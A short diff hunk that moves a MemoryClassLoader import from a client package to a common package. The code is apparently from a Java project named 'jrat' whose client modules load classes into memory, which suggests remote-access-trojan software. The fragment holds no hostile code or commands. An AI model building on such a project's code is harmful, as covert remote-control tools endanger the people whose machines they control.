@@ -3,7 +3,7 @@ package jrat.client.modules;
 import jrat.api.ClientModule;
 import jrat.client.Connection;
 import jrat.client.Main;
-import jrat.client.MemoryClassLoader;
+import jrat.common.MemoryClassLoader;
 import jrat.common.Logger;
 import jrat.common.compress.QuickLZ;
 
